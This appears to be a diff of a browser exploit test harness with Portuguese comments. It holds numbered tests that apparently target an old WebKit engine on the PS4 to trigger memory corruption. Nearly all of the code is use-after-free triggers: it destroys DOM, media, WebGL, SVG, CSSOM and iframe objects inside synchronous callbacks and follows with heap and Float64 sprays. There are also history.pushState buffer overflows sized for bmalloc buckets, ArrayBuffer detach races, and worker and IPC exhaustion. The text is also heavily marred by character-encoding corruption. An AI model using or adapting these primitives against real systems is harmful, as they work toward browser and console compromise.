+                logOutput("[Teste 172] Motor de hist√≥rico da janela colapsou perante a desanexa√ß√£o: " + e);
             }
         }
 
@@ -923,28 +924,28 @@
 
                 video.onprogress = function() {
                     try {
-                        // A thread C++ de rede est· ativamente a baixar e processar os pacotes de video.
+                        // A thread C++ de rede est√° ativamente a baixar e processar os pacotes de video.
                         // 1. Marretada na rede global.
                         window.stop();
                         
-                        // 2. Aniquilamos o nÛ alvo
+                        // 2. Aniquilamos o n√≥ alvo
                         video.remove();
                         video = null;
                         
-                        // 3. Sujamos a memÛria que a thread de I/O vai tentar usar para reportar o erro
+                        // 3. Sujamos a mem√≥ria que a thread de I/O vai tentar usar para reportar o erro
                         window.sprayStop = heapSpray();
                         
-                        logOutput("[Teste 173] window.stop() executado a meio do I/O de media. MemÛria pulverizada.");
+                        logOutput("[Teste 173] window.stop() executado a meio do I/O de media. Mem√≥ria pulverizada.");
                     } catch(err) {}
                 };
 
-                // Um payload falso grande para forÁar a thread de I/O a engatar
+                // Um payload falso grande para for√ßar a thread de I/O a engatar
                 let fakeData = new Uint8Array(5 * 1024 * 1024); 
                 let blob = new Blob([fakeData], { type: 'video/mp4' });
                 video.src = URL.createObjectURL(blob);
 
             } catch(e) {
-                logOutput("[Teste 173] A thread assÌncrona do HTMLMediaElement falhou no aborto: " + e);
+                logOutput("[Teste 173] A thread ass√≠ncrona do HTMLMediaElement falhou no aborto: " + e);
             }
         }
 
@@ -958,27 +959,27 @@
                 let iframe = document.createElement('iframe');
                 container.appendChild(iframe);
 
-                // Colocamos o C++ a processar um nÛ complexo na janela filha
+                // Colocamos o C++ a processar um n√≥ complexo na janela filha
                 let docFilho = iframe.contentWindow.document;
                 let alvo = docFilho.createElement('div');
-                alvo.innerHTML = "<span>NÛ Isolado</span>".repeat(100);
+                alvo.innerHTML = "<span>N√≥ Isolado</span>".repeat(100);
                 docFilho.body.appendChild(alvo);
 
                 // O C++ Node::adoptNode muda o 'ownerDocument' nas entranhas do motor
-                let nÛAdotado = document.adoptNode(alvo);
+                let n√≥Adotado = document.adoptNode(alvo);
 
-                // Antes mesmo de o anexarmos ao nosso DOM, destruÌmos a janela de origem completamente
+                // Antes mesmo de o anexarmos ao nosso DOM, destru√≠mos a janela de origem completamente
                 iframe.remove();
                 iframe = null;
 
                 window.sprayAdopt = heapSpray();
 
-                // Agora forÁamos o C++ a tentar renderizar o nÛ adotado cuja origem foi pulverizada
-                container.appendChild(nÛAdotado);
+                // Agora for√ßamos o C++ a tentar renderizar o n√≥ adotado cuja origem foi pulverizada
+                container.appendChild(n√≥Adotado);
 
-                logOutput("[Teste 174] adoptNode trans-documento concluÌdo. Motor n„o colapsou ao renderizar memÛria orf„.");
+                logOutput("[Teste 174] adoptNode trans-documento conclu√≠do. Motor n√£o colapsou ao renderizar mem√≥ria orf√£.");
             } catch(e) {
-                logOutput("[Teste 174] Falha grave de Type Confusion na reatribuiÁ„o de dono de nÛs: " + e);
+                logOutput("[Teste 174] Falha grave de Type Confusion na reatribui√ß√£o de dono de n√≥s: " + e);
             }
         }
 
@@ -994,14 +995,14 @@
                 
                 let gl = canvas.getContext('webgl');
                 if (!gl) {
-                    logOutput("[Teste 175] WebGL n„o suportado neste contexto.");
+                    logOutput("[Teste 175] WebGL n√£o suportado neste contexto.");
                     return;
                 }
 
-                // Extens„o nativa para simular crash de GPU
+                // Extens√£o nativa para simular crash de GPU
                 let ext = gl.getExtension('WEBGL_lose_context');
                 if (!ext) {
-                    logOutput("[Teste 175] Extens„o WEBGL_lose_context n„o habilitada no motor.");
+                    logOutput("[Teste 175] Extens√£o WEBGL_lose_context n√£o habilitada no motor.");
                     return;
                 }
 
@@ -1012,13 +1013,13 @@
                     e.preventDefault();
                     try {
                         // O C++ assinalou o hardware como "perdido".
-                        // Invocamos mÈtodos destrutivos em objetos que deveriam estar intoc·veis neste estado.
+                        // Invocamos m√©todos destrutivos em objetos que deveriam estar intoc√°veis neste estado.
                         gl.deleteBuffer(bufferGL);
                         canvas.remove();
                         canvas = null;
                         
                         window.sprayGL = heapSpray();
-                        logOutput("[Teste 175] Contexto WebGL destruÌdo e memÛria pulverizada com sucesso.");
+                        logOutput("[Teste 175] Contexto WebGL destru√≠do e mem√≥ria pulverizada com sucesso.");
                     } catch(err) {}
                 }, false);
 
@@ -1026,7 +1027,7 @@
                 ext.loseContext();
 
             } catch(e) {
-                logOutput("[Teste 175] Motor gr·fico colapsou durante o desmantelamento de estado do WebGL: " + e);
+                logOutput("[Teste 175] Motor gr√°fico colapsou durante o desmantelamento de estado do WebGL: " + e);
             }
         }
  // ==========================================
@@ -1044,11 +1045,11 @@
                 let range = document.createRange();
                 range.selectNodeContents(div);
 
-                // Evento legado do WebKit - Extremamente sÌncrono e perigoso
+                // Evento legado do WebKit - Extremamente s√≠ncrono e perigoso
                 noTexto.addEventListener('DOMCharacterDataModified', function handler() {
                     try {
-                        // O C++ pausou a atualizaÁ„o da ·rvore DOM para invocar este callback
-                        // DestruÌmos violentamente o conte˙do do Range na memÛria nativa
+                        // O C++ pausou a atualiza√ß√£o da √°rvore DOM para invocar este callback
+                        // Destru√≠mos violentamente o conte√∫do do Range na mem√≥ria nativa
                         range.deleteContents();
                         range.detach();
                         
@@ -1056,15 +1057,15 @@
                         window.sprayText = heapSpray();
                         
                         noTexto.removeEventListener('DOMCharacterDataModified', handler);
-                        logOutput("[Teste 176] Evento de mutaÁ„o sÌncrono intercetado. Range apagado a meio da modificaÁ„o.");
+                        logOutput("[Teste 176] Evento de muta√ß√£o s√≠ncrono intercetado. Range apagado a meio da modifica√ß√£o.");
                     } catch(err) {}
                 });
 
-                // Engatilha a rotina C++ de modificaÁ„o de nÛs de texto
+                // Engatilha a rotina C++ de modifica√ß√£o de n√≥s de texto
                 noTexto.data = "Texto Malicioso";
 
             } catch(e) {
-                logOutput("[Teste 176] Motor WebCore protegeu a reentr‚ncia de texto: " + e);
+                logOutput("[Teste 176] Motor WebCore protegeu a reentr√¢ncia de texto: " + e);
             }
         }
 
@@ -1084,8 +1085,8 @@
 
                 imgFake.onload = function() {
                     try {
-                        // Criamos um Proxy que se disfarÁa de imagem para o C++
-                        // Quando o WebKit C++ tentar ler o objeto para criar o padr„o, nÛs o destruÌmos
+                        // Criamos um Proxy que se disfar√ßa de imagem para o C++
+                        // Quando o WebKit C++ tentar ler o objeto para criar o padr√£o, n√≥s o destru√≠mos
                         let armadilha = new Proxy(imgFake, {
                             get: function(alvo, prop) {
                                 if (prop === 'width' || prop === 'naturalWidth') {
@@ -1093,7 +1094,7 @@
                                     alvo.src = "";
                                     canvas.remove();
                                     
-                                    // Pulverizamos a memÛria de renderizaÁ„o 2D
+                                    // Pulverizamos a mem√≥ria de renderiza√ß√£o 2D
                                     window.sprayPattern = heapSpray();
                                 }
                                 return alvo[prop];
@@ -1104,7 +1105,7 @@
                         let pattern = ctx.createPattern(armadilha, "repeat");
                         logOutput("[Teste 177] createPattern tentou processar a armadilha de Proxy.");
                     } catch(e) {
-                        logOutput("[Teste 177] O C++ bloqueou o padr„o corrompido de forma segura: " + e);
+                        logOutput("[Teste 177] O C++ bloqueou o padr√£o corrompido de forma segura: " + e);
                     }
                 };
             } catch(e) {
@@ -1123,7 +1124,7 @@
                 let style = document.createElement('style');
                 document.head.appendChild(style);
                 let sheet = style.sheet;
-                // AnimaÁ„o de 1 milissegundo para engatilhar o evento quase instantaneamente
+                // Anima√ß√£o de 1 milissegundo para engatilhar o evento quase instantaneamente
                 sheet.insertRule("@keyframes pisca { to { opacity: 0; } }", 0);
                 sheet.insertRule("#animAlvo { animation: pisca 0.001s; }", 1);
 
@@ -1134,20 +1135,20 @@
                 // Evento legado exato suportado pelo PS4
                 div.addEventListener('webkitanimationend', function() {
                     try {
-                        // O motor de renderizaÁ„o terminou a animaÁ„o e est· a aplicar o layout final.
-                        // DestruÌmos as regras de animaÁ„o na memÛria C++ (CSSOM).
+                        // O motor de renderiza√ß√£o terminou a anima√ß√£o e est√° a aplicar o layout final.
+                        // Destru√≠mos as regras de anima√ß√£o na mem√≥ria C++ (CSSOM).
                         sheet.deleteRule(1);
                         sheet.deleteRule(0);
                         
-                        // Pulverizamos para sujar a memÛria das estruturas CSSRule C++
+                        // Pulverizamos para sujar a mem√≥ria das estruturas CSSRule C++
                         window.sprayCSS = heapSpray();
                         
-                        logOutput("[Teste 178] webkitanimationend disparado. Regras apagadas e memÛria pulverizada.");
+                        logOutput("[Teste 178] webkitanimationend disparado. Regras apagadas e mem√≥ria pulverizada.");
                     } catch(err) {}
                 });
 
             } catch(e) {
-                logOutput("[Teste 178] CSSOM sobreviveu ‡ aniquilaÁ„o das regras de animaÁ„o: " + e);
+                logOutput("[Teste 178] CSSOM sobreviveu √† aniquila√ß√£o das regras de anima√ß√£o: " + e);
             }
         }
 
@@ -1163,31 +1164,31 @@
                 svg.appendChild(rect);
                 container.appendChild(svg);
 
-                // Iframe para servir de abismo de adoÁ„o
+                // Iframe para servir de abismo de ado√ß√£o
                 let iframe = document.createElement('iframe');
                 container.appendChild(iframe);
 
                 if (typeof svg.suspendRedraw === 'function') {
-                    // C++: Pausa a renderizaÁ„o por 500ms
+                    // C++: Pausa a renderiza√ß√£o por 500ms
                     let suspensao = svg.suspendRedraw(500);
 
-                    // Enquanto o motor gr·fico est· em pausa com ponteiros alocados,
-                    // arrancamos o nÛ para o contexto do iframe (muda o dono C++ internamente)
+                    // Enquanto o motor gr√°fico est√° em pausa com ponteiros alocados,
+                    // arrancamos o n√≥ para o contexto do iframe (muda o dono C++ internamente)
                     iframe.contentWindow.document.adoptNode(rect);
 
-                    // Aniquilamos o iframe e pulverizamos a memÛria livre
+                    // Aniquilamos o iframe e pulverizamos a mem√≥ria livre
                     iframe.remove();
                     window.spraySVG = heapSpray();
 
-                    // ForÁamos a retoma C++. O motor tentar· desenhar o rect que agora pertence a um contexto destruÌdo.
+                    // For√ßamos a retoma C++. O motor tentar√° desenhar o rect que agora pertence a um contexto destru√≠do.
                     svg.unsuspendRedraw(suspensao);
                     
                     logOutput("[Teste 179] suspendRedraw e adoptNode processados com sucesso.");
                 } else {
-                    logOutput("[Teste 179] API suspendRedraw inativa nesta vers„o vetorial.");
+                    logOutput("[Teste 179] API suspendRedraw inativa nesta vers√£o vetorial.");
                 }
             } catch(e) {
-                logOutput("[Teste 179] Engine vetorial tratou a adoÁ„o orf„ de forma segura: " + e);
+                logOutput("[Teste 179] Engine vetorial tratou a ado√ß√£o orf√£ de forma segura: " + e);
             }
         }
 
@@ -1209,25 +1210,25 @@
 
                 audio.onemptied = function() {
                     try {
-                        // A fila do MediaElement foi forÁada a esvaziar.
+                        // A fila do MediaElement foi for√ßada a esvaziar.
                         // Reescrevemos o contentor pai violentamente, destruindo o objeto <audio> nativo.
                         wrapper.outerHTML = "<p>Media Aniquilada</p>";
                         
-                        // Pulverizamos o Heap para intercetar as vari·veis de estado de rede e buffer do C++
+                        // Pulverizamos o Heap para intercetar as vari√°veis de estado de rede e buffer do C++
                         window.sprayEmptied = heapSpray();
                         
-                        logOutput("[Teste 180] Buffer de media esvaziado, nÛ destruÌdo com outerHTML e Heap pulverizado.");
+                        logOutput("[Teste 180] Buffer de media esvaziado, n√≥ destru√≠do com outerHTML e Heap pulverizado.");
                     } catch(err) {}
                 };
 
-                // Apenas alterar o src enquanto o motor tenta ler forÁa o disparo sÌncrono do 'onemptied' no WebKit antigo
+                // Apenas alterar o src enquanto o motor tenta ler for√ßa o disparo s√≠ncrono do 'onemptied' no WebKit antigo
                 setTimeout(() => {
                     audio.src = "";
                     audio.load();
                 }, 50);
 
             } catch(e) {
-                logOutput("[Teste 180] Motor MultimÈdia lidou com a reentr‚ncia do onemptied em seguranÁa: " + e);
+                logOutput("[Teste 180] Motor Multim√©dia lidou com a reentr√¢ncia do onemptied em seguran√ßa: " + e);
             }
         }
  // ==========================================
@@ -1247,18 +1248,18 @@
                 let range = document.createRange();
                 range.selectNode(p);
 
-                // O evento sÌncrono interceta a extraÁ„o C++ a meio
+                // O evento s√≠ncrono interceta a extra√ß√£o C++ a meio
                 p.addEventListener('DOMNodeRemoved', function handler() {
                     try {
-                        // DestrÛi a raiz do range inteiro da memÛria nativa
+                        // Destr√≥i a raiz do range inteiro da mem√≥ria nativa
                         div.remove();
                         range.detach();
                         
-                        // Pulveriza o Heap para tentar subscrever as vari·veis locais do ContainerNode C++
+                        // Pulveriza o Heap para tentar subscrever as vari√°veis locais do ContainerNode C++
                         window.sprayRange = heapSpray();
                         
                         p.removeEventListener('DOMNodeRemoved', handler);
-                        logOutput("[Teste 181] ExtraÁ„o do Range intercetada. NÛ pai aniquilado com sucesso.");
+                        logOutput("[Teste 181] Extra√ß√£o do Range intercetada. N√≥ pai aniquilado com sucesso.");
                     } catch(err) {}
                 });
 
@@ -1266,7 +1267,7 @@
                 range.surroundContents(wrapper);
 
             } catch(e) {
-                logOutput("[Teste 181] Motor WebCore protegeu a transaÁ„o do Range: " + e);
+                logOutput("[Teste 181] Motor WebCore protegeu a transa√ß√£o do Range: " + e);
             }
         }
 
@@ -1279,7 +1280,7 @@
                 const container = document.getElementById('test-containers');
                 let bloco = document.createElement('div');
                 
-                // Injeta m˙ltiplos nÛs de texto adjacentes para forÁar iteraÁ„o C++
+                // Injeta m√∫ltiplos n√≥s de texto adjacentes para for√ßar itera√ß√£o C++
                 let t1 = document.createTextNode("Parte 1");
                 let t2 = document.createTextNode("Parte 2");
                 bloco.appendChild(t1);
@@ -1288,22 +1289,22 @@
 
                 t1.addEventListener('DOMCharacterDataModified', function handler() {
                     try {
-                        // A engine C++ est· ativamente a concatenar t2 em t1 e disparou a notificaÁ„o
+                        // A engine C++ est√° ativamente a concatenar t2 em t1 e disparou a notifica√ß√£o
                         bloco.remove();
-                        t2.remove(); // Tenta corromper o prÛximo ponteiro da iteraÁ„o
+                        t2.remove(); // Tenta corromper o pr√≥ximo ponteiro da itera√ß√£o
                         
                         window.sprayNormalize = heapSpray();
                         
                         t1.removeEventListener('DOMCharacterDataModified', handler);
-                        logOutput("[Teste 182] NotificaÁ„o de texto sÌncrona recebida. ¡rvore de normalizaÁ„o destruÌda.");
+                        logOutput("[Teste 182] Notifica√ß√£o de texto s√≠ncrona recebida. √Årvore de normaliza√ß√£o destru√≠da.");
                     } catch(err) {}
                 });
 
-                // A funÁ„o nativa vai fundir os textos e disparar o evento
+                // A fun√ß√£o nativa vai fundir os textos e disparar o evento
                 bloco.normalize();
 
             } catch(e) {
-                logOutput("[Teste 182] A iteraÁ„o de Node::normalize lidou com a mutaÁ„o violenta: " + e);
+                logOutput("[Teste 182] A itera√ß√£o de Node::normalize lidou com a muta√ß√£o violenta: " + e);
             }
         }
 
@@ -1317,27 +1318,27 @@
                 let iframe = document.createElement('iframe');
                 container.appendChild(iframe);
 
-                // ForÁa o foco na janela principal
+                // For√ßa o foco na janela principal
                 window.focus();
 
                 window.onblur = function() {
                     try {
-                        // O C++ est· a transferir o estado de foco para o iframe.
-                        // Imediatamente aniquilamos o destinat·rio do foco!
+                        // O C++ est√° a transferir o estado de foco para o iframe.
+                        // Imediatamente aniquilamos o destinat√°rio do foco!
                         iframe.remove();
                         iframe = null;
                         
                         window.sprayFocus = heapSpray();
-                        logOutput("[Teste 183] Foco intercetado no onblur sÌncrono. Iframe de destino assassinado.");
+                        logOutput("[Teste 183] Foco intercetado no onblur s√≠ncrono. Iframe de destino assassinado.");
                         window.onblur = null;
                     } catch(err) {}
                 };
 
-                // Pede nativamente para focar a janela interna, o que forÁar· o onblur sÌncrono
+                // Pede nativamente para focar a janela interna, o que for√ßar√° o onblur s√≠ncrono
                 iframe.contentWindow.focus();
 
             } catch(e) {
-                logOutput("[Teste 183] DOMWindow C++ transferiu a m·quina de estados em seguranÁa: " + e);
+                logOutput("[Teste 183] DOMWindow C++ transferiu a m√°quina de estados em seguran√ßa: " + e);
             }
         }
 
@@ -1360,21 +1361,21 @@
                 
                 cue.onenter = function() {
                     try {
-                        // O parser C++ disparou o evento porque o vÌdeo "entrou" no intervalo da legenda.
-                        // Arrasamos com o contentor de vÌdeo inteiro.
+                        // O parser C++ disparou o evento porque o v√≠deo "entrou" no intervalo da legenda.
+                        // Arrasamos com o contentor de v√≠deo inteiro.
                         container.innerHTML = '';
                         
-                        // Pulveriza a memÛria na tentativa de intercetar os ponteiros da faixa
+                        // Pulveriza a mem√≥ria na tentativa de intercetar os ponteiros da faixa
                         window.sprayCue = heapSpray();
-                        logOutput("[Teste 184] onenter C++ genuÌno recebido. Motor MultimÈdia apagado instantaneamente.");
+                        logOutput("[Teste 184] onenter C++ genu√≠no recebido. Motor Multim√©dia apagado instantaneamente.");
                     } catch(err) {}
                 };
 
                 track.addCue(cue);
 
-                // Engatilha o motor de media para iniciar a verificaÁ„o de tempo
+                // Engatilha o motor de media para iniciar a verifica√ß√£o de tempo
                 video.play().catch(()=>{});
-                // ForÁa o relÛgio interno a disparar o onenter
+                // For√ßa o rel√≥gio interno a disparar o onenter
                 video.currentTime = 1;
 
             } catch(e) {
@@ -1402,10 +1403,10 @@
                 let iframeEspiao = document.createElement('iframe');
                 container.appendChild(iframeEspiao);
 
-                // Injeta cÛdigo no iframe para escutar o resize sÌncrono da engine gr·fica
+                // Injeta c√≥digo no iframe para escutar o resize s√≠ncrono da engine gr√°fica
                 iframeEspiao.contentWindow.onresize = function() {
                     try {
-                        // Enquanto o motor est· a calcular as mÈtricas visuais...
+                        // Enquanto o motor est√° a calcular as m√©tricas visuais...
                         sheet.deleteRule(0);
                         window.sprayCanvasFont = heapSpray();
                     } catch(err) {}
@@ -1414,25 +1415,25 @@
                 // Define a fonte que o C++ tem de pesquisar no CSSOM
                 ctx.font = "50px VulnFont";
                 
-                // ForÁa o resize do iframe para engatilhar o evento paralelo
+                // For√ßa o resize do iframe para engatilhar o evento paralelo
                 iframeEspiao.style.width = "50px";
 
-                // Desenha o texto, o que bloqueia atÈ a fonte ser resolvida pelo WebCore
+                // Desenha o texto, o que bloqueia at√© a fonte ser resolvida pelo WebCore
                 ctx.fillText("Crash Test", 10, 50);
 
-                logOutput("[Teste 185] RenderizaÁ„o de fonte no Canvas concluÌda sem falha de segmentaÁ„o.");
+                logOutput("[Teste 185] Renderiza√ß√£o de fonte no Canvas conclu√≠da sem falha de segmenta√ß√£o.");
                 setTimeout(() => { if(style.parentNode) style.remove(); }, 100);
             } catch(e) {
-                logOutput("[Teste 185] Motor de fontes C++ imune ‡ corrupÁ„o sÌncrona do CSSOM: " + e);
+                logOutput("[Teste 185] Motor de fontes C++ imune √† corrup√ß√£o s√≠ncrona do CSSOM: " + e);
             }
         }
 // ==========================================
         // Teste 186: History pushState + DOM Allocation (Heap Smash)
-        // EvoluÁ„o da sua POC: Funde o overflow do history com alocaÁ„o DOM massiva para forÁar o crash
+        // Evolu√ß√£o da sua POC: Funde o overflow do history com aloca√ß√£o DOM massiva para for√ßar o crash
         // ==========================================
         function runTest186() {
             clearOutput();
-            logOutput("[Teste 186] A iniciar Heap Smash no histÛrico...");
+            logOutput("[Teste 186] A iniciar Heap Smash no hist√≥rico...");
             try {
                 const BASE_SIZE = 709522; // Alvo do bucket de 1MB
                 const OOB_SIZE = 340000;
@@ -1441,19 +1442,19 @@
                 const overflow = "\x01".repeat(OOB_SIZE);
                 const payload = "/" + base + overflow + "AAAA";
 
-                // Injeta na memÛria C++
+                // Injeta na mem√≥ria C++
                 history.pushState({}, "", payload);
-                logOutput("Payload injetado no bmalloc. A forÁar leitura da memÛria corrompida...");
+                logOutput("Payload injetado no bmalloc. A for√ßar leitura da mem√≥ria corrompida...");
 
-                // Imediatamente aloca milhares de nÛs DOM para forÁar o alocador a colidir com o overflow
+                // Imediatamente aloca milhares de n√≥s DOM para for√ßar o alocador a colidir com o overflow
                 let frag = document.createDocumentFragment();
                 for(let i = 0; i < 50000; i++) {
                     let d = document.createElement('div');
-                    d.className = "A".repeat(100); // Usa memÛria contÌgua
+                    d.className = "A".repeat(100); // Usa mem√≥ria cont√≠gua
                     frag.appendChild(d);
                 }
                 document.body.appendChild(frag);
-                logOutput("AlocaÁ„o DOM concluÌda sem Crash imediato.");
+                logOutput("Aloca√ß√£o DOM conclu√≠da sem Crash imediato.");
 
             } catch(e) {
                 logOutput("Erro: " + e);
@@ -1462,7 +1463,7 @@
 
         // ==========================================
         // Teste 187: SharedWorker + MessageChannel (IPC Descriptor Exhaustion)
-        // Usa a tÈcnica de SharedWorker mas sobrecarrega com portas MessageChannel
+        // Usa a t√©cnica de SharedWorker mas sobrecarrega com portas MessageChannel
         // ==========================================
         window.keeps187 = [];
         function runTest187() {
@@ -1481,16 +1482,16 @@
                         sw.port.postMessage("open", [mc.port2]);
                         
                         window.keeps187.push(sw);
-                        window.keeps187.push(mc.port1); // MantÈm a porta viva
+                        window.keeps187.push(mc.port1); // Mant√©m a porta viva
                         count++;
                     } catch(e) {
                         clearInterval(interval);
-                        logOutput("Falha de alocaÁ„o IPC aos: " + count + " workers.");
+                        logOutput("Falha de aloca√ß√£o IPC aos: " + count + " workers.");
                         return;
                     }
                 }
                 if (count % 50 === 0) logOutput("Portas IPC ativas: " + count);
-                if (count > 800) clearInterval(interval); // ProteÁ„o caso n„o crashe
+                if (count > 800) clearInterval(interval); // Prote√ß√£o caso n√£o crashe
             }, 10);
         }
 
@@ -1499,14 +1500,14 @@
         // ==========================================
         function runTest188() {
             clearOutput();
-            logOutput("[Teste 188] A forÁar Stack Overflow em Pthreads via Atomics...");
+            logOutput("[Teste 188] A for√ßar Stack Overflow em Pthreads via Atomics...");
             
             const workerCode = `
                 onmessage = (e) => {
                     const sab = e.data;
                     const view = new Int32Array(sab);
                     
-                    // FunÁ„o recursiva para estourar a Red Zone da Thread
+                    // Fun√ß√£o recursiva para estourar a Red Zone da Thread
                     function explodeStack(n) {
                         const v = new Float64Array(256); // Aloca muito no stack
                         if (n > 0) explodeStack(n - 1);
@@ -1521,7 +1522,7 @@
             
             const sab = new SharedArrayBuffer(1024);
             
-            // LanÁa v·rias threads simult‚neas para esmagar a CPU
+            // Lan√ßa v√°rias threads simult√¢neas para esmagar a CPU
             for(let i=0; i < 20; i++) {
                 let w = new Worker(url);
                 w.onmessage = (e) => logOutput(e.data);
@@ -1540,11 +1541,11 @@
             let count = 0;
             const interval = setInterval(() => {
                 for(let i = 0; i < 20; i++) {
-                    // Cria Blobs ˙nicos constantemente para estressar o FileSystem virtual
+                    // Cria Blobs √∫nicos constantemente para estressar o FileSystem virtual
                     let blob = new Blob(["// Lixo " + count + "_" + i], {type: "text/javascript"});
                     let url = URL.createObjectURL(blob);
                     
-                    // Cria e abandona Workers para forÁar Wraparound de IDs
+                    // Cria e abandona Workers para for√ßar Wraparound de IDs
                     let w = new Worker(url);
                     w.postMessage("die");
                 }
@@ -1556,7 +1557,7 @@
 
         // ==========================================
         // Teste 190: ArrayBuffer Sort Detach (Thread Race)
-        // EvoluÁ„o da sua PoC de Sort com transferÍncia violenta de ArrayBuffer
+        // Evolu√ß√£o da sua PoC de Sort com transfer√™ncia violenta de ArrayBuffer
         // ==========================================
         function runTest190() {
             clearOutput();
@@ -1565,26 +1566,26 @@
             try {
                 // Buffer muito grande para garantir que o sort demore nativamente
                 const buffer = new ArrayBuffer(5 * 1024 * 1024); // 5MB
-                const array = new Float64Array(buffer); // Float forÁa matem·tica pesada
+                const array = new Float64Array(buffer); // Float for√ßa matem√°tica pesada
                 
                 for(let i=0; i<array.length; i++) array[i] = Math.random();
                 
                 const w = new Worker(URL.createObjectURL(new Blob(["onmessage=()=>{}"], {type:"text/javascript"})));
                 let detached = false;
                 
-                logOutput("A iniciar ordenaÁ„o C++...");
+                logOutput("A iniciar ordena√ß√£o C++...");
                 
                 array.sort((a, b) => {
                     if (!detached) {
-                        // A meio da ordenaÁ„o C++, transferimos a memÛria subjacente para a thread
+                        // A meio da ordena√ß√£o C++, transferimos a mem√≥ria subjacente para a thread
                         w.postMessage(buffer, [buffer]);
                         detached = true;
                     }
-                    // Retorna matem·tica para obrigar o C++ a ler os ponteiros agora mortos
+                    // Retorna matem√°tica para obrigar o C++ a ler os ponteiros agora mortos
                     return a - b;
                 });
                 
-                logOutput("Sort sobreviveu. A vulnerabilidade de ArrayBuffer foi corrigida nesta vers„o.");
+                logOutput("Sort sobreviveu. A vulnerabilidade de ArrayBuffer foi corrigida nesta vers√£o.");
                 w.terminate();
             } catch(e) {
                 logOutput("Erro esperado ou Crash evitado: " + e.message);
@@ -1595,7 +1596,7 @@
         // ==========================================
         function runTest191() {
             clearOutput();
-            logOutput("[Teste 191] A forÁar desalinhamento do alocador do history...");
+            logOutput("[Teste 191] A for√ßar desalinhamento do alocador do history...");
             try {
                 // Baseado nos tamanhos que reportam crash consistente na sua PoC (977 + 14460)
                 let size = 977 + (14460 * 2); 
@@ -1605,14 +1606,14 @@
                 history.pushState({}, "", "#" + payload1);
                 
                 // 2. Imediatamente faz replace reduzindo o tamanho abruptamente.
-                // Isto forÁa o WebKit a encurtar o buffer de string em memÛria.
+                // Isto for√ßa o WebKit a encurtar o buffer de string em mem√≥ria.
                 const payload2 = payload1.slice(0, 977);
                 history.replaceState({}, "", "#" + payload2);
                 
-                // 3. Empurra mais um estado para forÁar o alocador a reutilizar o "buraco" anterior
+                // 3. Empurra mais um estado para for√ßar o alocador a reutilizar o "buraco" anterior
                 history.pushState({}, "", "#B");
                 
-                logOutput("ManipulaÁ„o exata concluÌda. Se o bmalloc n„o crashou, a mitigaÁ„o est· ativa.");
+                logOutput("Manipula√ß√£o exata conclu√≠da. Se o bmalloc n√£o crashou, a mitiga√ß√£o est√° ativa.");
             } catch(e) {
                 logOutput("Erro de history: " + e);
             }
@@ -1629,9 +1630,9 @@
             mediaTarget.src = "blob:null"; // Dummy src
             container.appendChild(mediaTarget);
             
-            logOutput("[Teste 192] A solicitar ecr„ inteiro. PRESSIONE OPTIONS AGORA!");
+            logOutput("[Teste 192] A solicitar ecr√£ inteiro. PRESSIONE OPTIONS AGORA!");
 
-            // Solicita ecr„ inteiro para forÁar o contexto do sistema operativo
+            // Solicita ecr√£ inteiro para for√ßar o contexto do sistema operativo
             if (mediaTarget.webkitRequestFullscreen) mediaTarget.webkitRequestFullscreen();
 
             window.onblur = function() {
@@ -1644,7 +1645,7 @@
                     // Preenchemos o buraco com 0x4141414141414141
                     window.poisonedMemory = elegantFloatSpray();
                     
-                    // Tentamos referenciar algo para forÁar a avaliaÁ„o C++ no retorno (Refresh)
+                    // Tentamos referenciar algo para for√ßar a avalia√ß√£o C++ no retorno (Refresh)
                     document.title = "Poisoned";
                     
                     logOutput("[Teste 192] UAF e Float64 Spray executados no onblur!");
@@ -1658,7 +1659,7 @@
         // ==========================================
         function runTest193() {
             clearOutput();
-            logOutput("[Teste 193] A engatilhar bloqueio Futex no Kernel (Thread ˙nica)...");
+            logOutput("[Teste 193] A engatilhar bloqueio Futex no Kernel (Thread √∫nica)...");
             
             try {
                 const workerCode = `
@@ -1682,7 +1683,7 @@
                 }, 15);
                 
             } catch(e) {
-                logOutput("Atomics bloqueado ou indisponÌvel: " + e);
+                logOutput("Atomics bloqueado ou indispon√≠vel: " + e);
             }
         }
 
@@ -1703,15 +1704,15 @@
                 // Inicia o envio da porta e do buffer por IPC
                 worker.port.postMessage({ buf: payload, port: channel.port2 }, [payload, channel.port2]);
                 
-                // No instante seguinte (na mesma tick de execuÁ„o, antes do flush IPC),
+                // No instante seguinte (na mesma tick de execu√ß√£o, antes do flush IPC),
                 // aniquilamos a porta de origem.
                 channel.port1.close();
                 worker.port.close();
                 
-                // Spray Float64 na esperanÁa de corromper a estrutura IPC da porta
+                // Spray Float64 na esperan√ßa de corromper a estrutura IPC da porta
                 window.sprayIPC = elegantFloatSpray();
                 
-                logOutput("Portas fechadas durante o tr‚nsito C++. Teste sem DoS concluÌdo.");
+                logOutput("Portas fechadas durante o tr√¢nsito C++. Teste sem DoS conclu√≠do.");
             } catch(e) {
                 logOutput("Erro IPC: " + e);
             }
@@ -1731,19 +1732,19 @@
                 let alvo = docFilho.createElementNS("http://www.w3.org/2000/svg", "svg");
                 docFilho.body.appendChild(alvo);
 
-                // Muda o dono do nÛ nas entranhas do C++
+                // Muda o dono do n√≥ nas entranhas do C++
                 let adotado = document.adoptNode(alvo);
 
-                // DestrÛi o iframe de origem
+                // Destr√≥i o iframe de origem
                 iframe.remove();
                 
-                // Spray com o padr„o Float64 (0x41414141...)
+                // Spray com o padr√£o Float64 (0x41414141...)
                 window.spraySVG = elegantFloatSpray();
                 
-                // Tenta forÁar o C++ a calcular as propriedades gr·ficas do nÛ adotado e agora "morto"
+                // Tenta for√ßar o C++ a calcular as propriedades gr√°ficas do n√≥ adotado e agora "morto"
                 let testMath = adotado.createSVGMatrix();
                 
-                logOutput("[Teste 195] adoptNode SVG processado com Float64 Spray a sobrepor a memÛria livre.");
+                logOutput("[Teste 195] adoptNode SVG processado com Float64 Spray a sobrepor a mem√≥ria livre.");
             } catch(e) {
                 logOutput("[Teste 195] Motor WebCore lidou bem com o ownership: " + e);
             }
@@ -1760,14 +1761,14 @@
                 let canais = [];
                 let payload = new ArrayBuffer(1024 * 64); // 64KB por porta
                 
-                // Abre 100 portas concorrentes (Aumenta a press„o no C++ sem chegar ao DoS)
+                // Abre 100 portas concorrentes (Aumenta a press√£o no C++ sem chegar ao DoS)
                 for(let i = 0; i < 100; i++) {
                     let mc = new MessageChannel();
                     canais.push(mc);
                     worker.port.postMessage({ buf: payload, port: mc.port2 }, [mc.port2]);
                 }
                 
-                logOutput("100 portas enviadas para a fila nativa. A executar Drop sÌncrono...");
+                logOutput("100 portas enviadas para a fila nativa. A executar Drop s√≠ncrono...");
                 
